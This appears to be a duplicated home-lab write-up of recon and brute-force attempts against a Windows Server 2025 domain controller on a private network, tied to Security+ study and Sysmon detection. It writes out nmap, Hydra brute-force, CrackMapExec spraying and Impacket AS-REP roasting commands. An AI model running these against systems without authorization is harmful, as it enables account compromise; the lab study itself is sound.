# 🔐 Brute Force Attack Attempt & Recon – Windows Server 2025 (192.168.1.2)

**Date:** April 11, 2025  
**Attacker Machine:** Kali Linux (192.168.1.10)  
**Target:** Windows Server 2025 – AD Domain Controller (192.168.1.2)  
**Domain:** `narnia.com`  
**Objective:** Enumerate services, test brute-force login techniques, and analyze detection.

---

## 🔎 Nmap Recon

```bash
nmap -sV 192.168.1.2
```

**Results:**
- 22/tcp   → OpenSSH for Windows
- 53/tcp   → Simple DNS Plus
- 88/tcp   → Kerberos
- 135/tcp  → MS RPC
- 139/tcp  → NetBIOS
- 389/tcp  → LDAP (AD)
- 445/tcp  → SMB
- 3389/tcp → RDP
- 5985/tcp → WinRM

> ✅ Confirmed this is an Active Directory Domain Controller.

---

## 🚪 Service Enumeration Attempts

### 🧪 Hydra - RDP Brute-force (FAILED)

```bash
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.2 -t 1 -W 3
```

**Result:**
- RDP module is **experimental**
- No login attempts succeeded
- Common error: `File for logins not found` due to misuse of `-L` instead of `-l`

---

### 📛 LDAP Brute-force Attempt (FAILED)

```bash
hydra -L user_list.txt -P rockyou.txt ldap3://192.168.1.2
```

- Required authentication method not set properly at first
- Updated command using `ldap3://` for simple auth

---

### 🔍 SMB Enumeration via CrackMapExec

```bash
crackmapexec smb 192.168.1.2 -u user_list.txt -p password123
```

**Result:**
- Windows 10 Build 26100 detected
- NETBIOS connection timed out
- Likely network timeout or access control

---

### 📚 Impacket GetNPUsers (FAILED)

```bash
impacket-GetNPUsers narnia.com/ -no-pass -usersfile user_list.txt
```

**Result:**
- File not found: `user_list.txt`
- User list needs to be rebuilt or verified

---

### 📂 LDAP Enumeration

```bash
ldapsearch -x -H ldap://192.168.1.2 -b "" -s base "(objectclass=*)" namingContexts
```

**Status:** Syntax adjusted – ready to extract baseDN for AD enumeration.

---

## 🛡️ Sysmon Detection

Sysmon Event ID 1 (`Process Create`) captured launch of:

```
C:\WINDOWS\Explorer.EXE /NoUACCheck
```

- Detected by: Sysmon
- User: NARNIA\Administrator
- Indicates: Post-exploitation or elevated session

📁 Evidence: [evid1.txt](/post_exploitation/event_logs/sysmon/evid1.txt)

---

## 📌 Notes & To-Dos

- [ ] Validate and populate `user_list.txt` with domain users
- [ ] Retry Hydra against SMB or LDAP with correct creds
- [ ] Test `ncrack` with RDP after fixing wordlist path
- [ ] Setup Wazuh alerts for Event ID 4625 & Sysmon EID 1

---

**Security+ Objectives Touched:**
- 2.1: Types of Attacks (brute-force, password spraying)
- 3.2: Apply host security measures (logging)
- 5.3: Use of logging and monitoring tools (Sysmon)

---

🔖 **Next Step:**  
Continue enumeration → privilege escalation → SIEM detection (Wazuh)

# 🔐 Brute Force Attack Attempt & Recon – Windows Server 2025 (192.168.1.2)

**Date:** April 11, 2025  
**Attacker Machine:** Kali Linux (192.168.1.10)  
**Target:** Windows Server 2025 – AD Domain Controller (192.168.1.2)  
**Domain:** `narnia.com`  
**Objective:** Enumerate services, test brute-force login techniques, and analyze detection.

---

## 🔎 Nmap Recon

```bash
nmap -sV 192.168.1.2
```

**Results:**
- 22/tcp   → OpenSSH for Windows
- 53/tcp   → Simple DNS Plus
- 88/tcp   → Kerberos
- 135/tcp  → MS RPC
- 139/tcp  → NetBIOS
- 389/tcp  → LDAP (AD)
- 445/tcp  → SMB
- 3389/tcp → RDP
- 5985/tcp → WinRM

> ✅ Confirmed this is an Active Directory Domain Controller.

---

## 🚪 Service Enumeration Attempts

### 🧪 Hydra - RDP Brute-force (FAILED)

```bash
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.2 -t 1 -W 3
```

**Result:**
- RDP module is **experimental**
- No login attempts succeeded
- Common error: `File for logins not found` due to misuse of `-L` instead of `-l`

---

### 📛 LDAP Brute-force Attempt (FAILED)

```bash
hydra -L user_list.txt -P rockyou.txt ldap3://192.168.1.2
```

- Required authentication method not set properly at first
- Updated command using `ldap3://` for simple auth

---

### 🔍 SMB Enumeration via CrackMapExec

```bash
crackmapexec smb 192.168.1.2 -u user_list.txt -p password123
```

**Result:**
- Windows 10 Build 26100 detected
- NETBIOS connection timed out
- Likely network timeout or access control

---

### 📚 Impacket GetNPUsers (FAILED)

```bash
impacket-GetNPUsers narnia.com/ -no-pass -usersfile user_list.txt
```

**Result:**
- File not found: `user_list.txt`
- User list needs to be rebuilt or verified

---

### 📂 LDAP Enumeration

```bash
ldapsearch -x -H ldap://192.168.1.2 -b "" -s base "(objectclass=*)" namingContexts
```

**Status:** Syntax adjusted – ready to extract baseDN for AD enumeration.

---

## 🛡️ Sysmon Detection

Sysmon Event ID 1 (`Process Create`) captured launch of:

```
C:\WINDOWS\Explorer.EXE /NoUACCheck
```

- Detected by: Sysmon
- User: NARNIA\Administrator
- Indicates: Post-exploitation or elevated session

📁 Evidence: [evid1.txt](/post_exploitation/event_logs/sysmon/evid1.txt)

---

## 📌 Notes & To-Dos

- [ ] Validate and populate `user_list.txt` with domain users
- [ ] Retry Hydra against SMB or LDAP with correct creds
- [ ] Test `ncrack` with RDP after fixing wordlist path
- [ ] Setup Wazuh alerts for Event ID 4625 & Sysmon EID 1

---

**Security+ Objectives Touched:**
- 2.1: Types of Attacks (brute-force, password spraying)
- 3.2: Apply host security measures (logging)
- 5.3: Use of logging and monitoring tools (Sysmon)

---

🔖 **Next Step:**  
Continue enumeration → privilege escalation → SIEM detection (Wazuh)

